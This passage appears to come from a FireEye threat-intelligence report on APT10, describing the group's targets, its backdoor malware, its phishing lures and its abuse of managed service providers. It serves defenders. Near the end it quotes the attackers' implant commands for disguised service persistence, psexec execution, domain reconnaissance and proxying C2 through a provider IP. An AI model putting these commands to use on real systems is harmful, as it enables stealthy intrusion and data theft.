They have historically targeted construction and engineering, aerospace, and\ntelecom firms, and governments in the United States, Europe, and Japan. We believe that\nthe targeting of these industries has been in support of Chinese national security goals,\nincluding acquiring valuable military and intelligence information as well as the theft of\nconfidential business data to support Chinese corporations. PwC and BAE recently issued a\n[joint blog detailing extensive APT10 activity.](https://baesystemsai.blogspot.com/2017/04/apt10-operation-cloud-hopper_3.html)\n\n**APT10’s Resurgence**\n\nIn June 2016, FireEye iSIGHT intelligence first reported that APT10 expanded their\noperations. The group was initially detected targeting a Japanese university, and more\nwidespread targeting in Japan was subsequently uncovered. Further collaboration between\nFireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered\nadditional victims worldwide, a new suite of tools and novel techniques.\n\n**Global Targeting Using New Tools**\n\nLeveraging its global footprint, FireEye has detected APT10 activity across six continents in\n2016 and 2017. APT10 has targeted or compromised manufacturing companies in India,\nJapan and Northern Europe; a mining company in South America; and multiple IT service\nproviders worldwide. We believe these companies are a mix of final targets and\norganizations that could provide a foothold in a final target.\n\nAPT10 unveiled new tools in its 2016/2017 activity. In addition to the continued use of\nSOGU, the current wave of intrusions has involved new tools we believe are unique to\nAPT10. HAYMAKER and SNUGRIDE have been used as first stage backdoors, while\nBUGJUICE and a customized version of the open source QUASARRAT have been used as\nsecond stage backdoors. These new pieces of malware show that APT10 is devoting\nresources to capability development and innovation.\n\nHAYMAKER is a backdoor that can download and execute additional payloads in the\nform of modules. It also conducts basic victim profiling activity, collecting the computer\nname, running process IDs, %TEMP% directory path and version of Internet Explorer.\nIt communicates encoded system information to a single hard coded command and\ncontrol (C2) server, using the system’s default User-Agent string.\nBUGJUICE is a backdoor that is executed by launching a benign file and then hijacking\nthe search order to load a malicious dll into it. That malicious dll then loads encrypted\nshellcode from the binary, which is decrypted and runs the final BUGJUICE payload.\nBUGJUICE defaults to TCP using a custom binary protocol to communicate with the\nC2, but can also use HTTP and HTTPs if directed by the C2. It has the capability to find\nfiles, enumerate drives, exfiltrate data, take screenshots and provide a reverse shell.\n\n\n-----\n\nSNUGRIDE is a backdoor that communicates with its C2 server through HTTP\nrequests. Messages are encrypted using AES with a static key. The malware’s\ncapabilities include taking a system survey, access to the filesystem, executing\ncommands and a reverse shell. Persistence is maintained through a Run registry key.\n[QUASARRAT is an open-source RAT available here. The versions used by APT10](https://github.com/quasar/Quasar)\n(1.3.4.0, 2.0.0.0, and 2.0.0.1) are not available via the public GitHub page, indicating\nthat APT10 has further customized the open source version. The 2.0 versions require a\ndropper to decipher and launch the AES encrypted QUASARRAT payload.\nQUASARRAT is a fully functional .NET backdoor that has been used by multiple cyber\nespionage groups in the past.\n\n**Traditional and Novel Methods**\n\nThis recent APT10 activity has included both traditional spear phishing and access to victim’s\nnetworks through service providers. (For more information on infection via service providers\nsee [M-Trends 2016). APT10 spear phishes have been relatively unsophisticated, leveraging](https://www.fireeye.com/blog/executive-perspective/2016/02/m-trends_2016.html)\n.lnk files within archives, files with double extensions (e.g.\n“[Redacted]_Group_Meeting_Document_20170222_doc_.exe) and in some cases simply\nidentically named decoy documents and malicious launchers within the same archive.\n\nIn addition to the spear phishes, FireEye ISIGHT Intelligence has observed APT10\naccessing victims through global service providers. Service providers have significant access\nto customer networks, enabling an attacker who had compromised a service provider to\nmove laterally into the network of the service provider’s customer. In addition, web traffic\nbetween a service provider’s customer and a service provider is likely to be viewed as\nbenign by network defenders at the customer, allowing the attacker to exfiltrate data\nstealthily. A notable instance of this observed by FireEye involved a SOGU backdoor that\nwas set to communicate with its C2 through a server belonging to the victim’s service\nprovider.\n\nAPT10 actors issued the following commands to a SOGU implant at a victim:\n\nsc create CorWrTool binPath= \"\\\"C:\\Windows\\vss\\vixDiskMountServer.exe\\\"\" start=\nauto displayname= \"Corel Writing Tools Utility\" type= own\nsc description CorWrTool \"Corel Graphics Corporation Applications.\"\nping -a [Redacted]\npsexec.exe <orghost> d.exe\nnet view /domain:[Redacted]\nproxyconnect - \"port\": 3389, \"server\": \"[IP Address Redacted]\"\n\nThese commands included setting persistence on the victim’s system. The actor then tested\nconnectivity to an IP managed by the victim’s service provider. Once connectivity to the\nservice provider IP was verified, the actor established the service provider IP as a proxy for\nthe victim’s SOGU backdoor. This effectively routes SOGU malware traffic through the\n\n\n-----\n\nvictim s service provider, which likely indicates a foothold on the service provider s network.\nThe tactic also serves to mask malicious C2 and exfiltration traffic and make it appear\ninnocuous.\n\n**Implications**\n\nAPT10 is a threat to organizations worldwide. Their abuse of access to service provider\nnetworks demonstrates that peripheral organizations continue to be of interest to a malicious\nactor – especially those seeking alternative angles of attack. We believe the pace of APT10\n[operations may slow following the public disclosure by the PwC/BAE blog; however, we](https://baesystemsai.blogspot.com/2017/04/apt10-operation-cloud-hopper_3.html)\nbelieve they will return to their large-scale operations, potentially employing new tactics,\ntechniques and procedures.\n\n\n-----",
